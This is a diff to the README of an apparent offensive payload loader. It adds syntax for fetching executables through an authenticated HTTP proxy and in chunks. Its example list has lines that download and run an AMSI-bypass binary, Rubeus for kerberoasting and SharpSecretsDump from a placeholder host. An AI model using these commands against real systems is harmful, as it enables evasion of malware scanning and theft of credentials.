@@ -32,10 +32,18 @@ The _split_ command can be used to achieve this, as an example, this script can 
 
 ```
 
+It is also possible to fetch payloads through an HTTP proxy, with credentials:
+```
+proxy http://<user>:<password>@<ip>:<port> http://mydomain.com/name.exe
+```
+
+All these options can be used together, position independently.
+
 Example _list.txt_
 ```txt
-http://mydomain.com/amsi_patch.exe
-http://mydomain.com/Rubeus.exe kerberoast
+proxy http://user:pass@127.0.0.1:8080 chunks 43 http://mydomain.com/amsi_patch.exe
+chunks 43 http://mydomain.com/Rubeus.exe kerberoast
+proxy http://user:pass@127.0.0.1:8080 http://mydomain.com/Rubeus.exe kerberoast
 C:\Users\Public\SharpSecretsDump.exe
 ```
 
